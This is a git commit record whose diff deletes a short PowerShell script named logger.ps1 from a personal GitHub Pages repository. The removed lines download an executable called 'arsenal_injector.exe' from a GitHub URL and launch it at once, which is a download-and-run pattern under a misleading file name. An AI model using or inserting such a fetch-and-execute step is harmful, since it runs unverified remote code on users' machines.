2de2fc5f3cd1133e15abe77ebb74f407a88169b1
creepyturnip <92087207+creepyturnip@users.noreply.github.com>
2023-06-21 13:09:56 +0200

    Delete personal directory

--- personal/logger.ps1
+++
@@ -1,7 +0,0 @@
-$ProcName = "arsenal_injector.exe"
-$WebFile = "https://github.com/creepyturnip/creepyturnip.github.io/raw/main/personal/$ProcName"
- 
-Clear-Host
- 
-(New-Object System.Net.WebClient).DownloadFile($WebFile,"$ProcName")
-Start-Process ("$ProcName")
